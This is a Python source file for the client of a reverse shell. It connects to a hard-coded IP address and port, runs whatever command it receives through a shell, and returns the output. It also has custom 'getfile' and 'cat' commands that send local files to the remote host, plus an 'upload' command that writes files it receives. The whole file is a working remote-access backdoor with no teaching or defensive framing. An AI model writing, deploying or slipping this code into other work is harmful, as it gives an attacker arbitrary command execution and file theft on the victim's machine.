import socket
import os
import subprocess


host = "172.20.10.2" # check everytime
port = 12348

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def common():
    op = subprocess.Popen(extracted, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    report = op.stdout.read()
    report_error = op.stderr.read()
    print(report.decode())
    print(report_error.decode())
    
    s.sendall(report)
    s.sendall(report_error)



print("Established Connection: ", host, ":", port)
s.connect((host, port))

while True:
    data = s.recv(5000)
    extracted = data.decode()
    print("Executed: ", extracted)
    # os.system(data.decode())

    if extracted[:2] == 'cd':
        try:
            os.chdir(extracted[3:])
            s.sendall(("Dir Changed "+extracted+"done").encode())
        except:
            s.sendall("No Such Directory".encode())
            print("No Such Directory")

    elif extracted[:5] == "mkdir":
        try:
            os.mkdir(extracted[5:])
            print("Executed: "+ extracted)
            s.sendall(("Executed "+extracted).encode())
        except:
            print("Unable to create Dir ")
            s.sendall("Unable to create Dir".encode())

    elif extracted[:7] == "getfile":
        try:
            f = open(extracted[8:], 'rb')
            data = f.read()
            print("file uploaded") 
            s.sendall(data)
            f.close()

        except:
            print("Unable to send")
            s.sendall("Unable to send".encode())
            

    elif extracted[:6] == "upload":
        try:
            f = open("recieved_"+extracted[7:],'wb')
            s.sendall("Ready".encode())
            f.write(s.recv(5000))
            f.close()
        except:
            print("Unable to Recieve")
            s.sendall("Unable to Recieve".encode())

    elif extracted[:3] == "cat":
        try:
            f = open(extracted[4:],'rb')
            data = f.read()
            s.sendall(data)
            print("Data sent to server")
            f.close()
        except:
            print("File Doesn't Exist")
            s.sendall("File Doesn't exist".encode())


    else:
        common()



